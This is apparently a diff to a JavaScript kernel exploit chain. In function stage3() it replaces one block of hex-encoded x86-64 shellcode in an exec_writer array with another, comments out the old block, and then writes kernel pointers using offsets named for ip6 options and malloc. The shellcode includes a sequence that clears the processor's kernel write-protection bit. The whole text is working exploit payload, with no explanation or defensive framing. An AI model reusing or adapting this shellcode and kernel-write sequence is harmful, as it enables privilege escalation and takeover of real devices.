@@ -2752,6 +2752,86 @@ function stage3() {
       while(1){};
   }
 
+	
+  exec_writer[0] = 0x54415355;
+  exec_writer[1] = 0x1111BB48;
+  exec_writer[2] = 0x11111111;
+  exec_writer[3] = 0xBD481111;
+  exec_writer[4] = 0x22222222;
+  exec_writer[5] = 0x22222222;
+  exec_writer[6] = 0xBFE4314D;
+  exec_writer[7] = 0x000000C0;
+  exec_writer[8] = 0xBADE8948;
+  exec_writer[9] = 0x00000002;
+  exec_writer[10] = 0x8349D5FF;
+  exec_writer[11] = 0x814901C4;
+  exec_writer[12] = 0x000500FC;
+  exec_writer[13] = 0x41E47500;
+  exec_writer[14] = 0x655D5B5C;
+  exec_writer[15] = 0x25048B48;
+  exec_writer[17] = 0x08408B48;
+  exec_writer[18] = 0x48408B48;
+  exec_writer[19] = 0x48008B48;
+  exec_writer[20] = 0x333333B9;
+  exec_writer[21] = 0x33333333;
+  exec_writer[22] = 0xC7C74833;
+  exec_writer[23] = 0x000002BE;
+  exec_writer[24] = 0x48F63148;
+  exec_writer[25] = 0x167DFE39;
+  exec_writer[26] = 0x83B1148B;
+  exec_writer[27] = 0x0874FFFA;
+  exec_writer[28] = 0xD004C748;
+  exec_writer[30] = 0x01C68348;
+  exec_writer[31] = 0xBF48E5EB;
+  exec_writer[32] = 0x44444444;
+  exec_writer[33] = 0x44444444;
+  exec_writer[34] = 0x5555BE48;
+  exec_writer[35] = 0x55555555;
+  exec_writer[36] = 0x89485555;
+  exec_writer[37] = 0x66BF4837;
+  exec_writer[38] = 0x66666666;
+  exec_writer[39] = 0x0F666666;
+  exec_writer[40] = 0x2548C020;
+  exec_writer[41] = 0xFFFEFFFF;
+  exec_writer[42] = 0xC6C0220F;
+  exec_writer[43] = 0x63A16087;
+  exec_writer[44] = 0x87C7C300;
+  exec_writer[45] = 0x00264C0A;
+  exec_writer[47] = 0x7B7787C6;
+  exec_writer[48] = 0xC7EB0008;
+  exec_writer[49] = 0x00049087;
+  exec_writer[51] = 0x87C76600;
+  exec_writer[52] = 0x000004B9;
+  exec_writer[53] = 0x87C6E990;
+  exec_writer[54] = 0x001D2336;
+  exec_writer[55] = 0x3987C637;
+  exec_writer[56] = 0x37001D23;
+  exec_writer[57] = 0xC187C766;
+  exec_writer[58] = 0x9000094E;
+  exec_writer[59] = 0x87C766E9;
+  exec_writer[60] = 0x0009547B;
+  exec_writer[61] = 0x87C7E990;
+  exec_writer[62] = 0x002F2C20;
+  exec_writer[63] = 0xC3C03148;
+  exec_writer[64] = 0x7087C748;
+  exec_writer[65] = 0x02011258;
+  exec_writer[66] = 0x48000000;
+  exec_writer[67] = 0xB192B78D;
+  exec_writer[68] = 0x89480006;
+  exec_writer[69] = 0x125878B7;
+  exec_writer[70] = 0x9C87C701;
+  exec_writer[71] = 0x01011258;
+  exec_writer[72] = 0xC7000000;
+  exec_writer[73] = 0x27002087;
+  exec_writer[74] = 0xC301B000;
+  exec_writer[75] = 0x000D4800;
+  exec_writer[76] = 0x0F000100;
+  exec_writer[77] = 0xB848C022;
+  exec_writer[78] = 0x80808080;
+  exec_writer[79] = 0x80808080;
+  exec_writer[80] = 0x909090C3;
+	
+	/*
   exec_writer[0] = 0x54415355;
   exec_writer[1] = 0x1111BB48;
   exec_writer[2] = 0x11111111;
@@ -2845,7 +2925,7 @@ function stage3() {
   exec_writer[90] = 0x8080B848;
   exec_writer[91] = 0x80808080;
   exec_writer[92] = 0x90C38080;
-
+*/
   p.write8(write_address.add32(0x6), kernel_base.add32(KERNEL_M_IP6OPT_OFFSET));
   p.write8(write_address.add32(0x10), kernel_base.add32(KERNEL_MALLOC_OFFSET));
   p.write8(write_address.add32(0x51), fix_these_sockets_ptr);
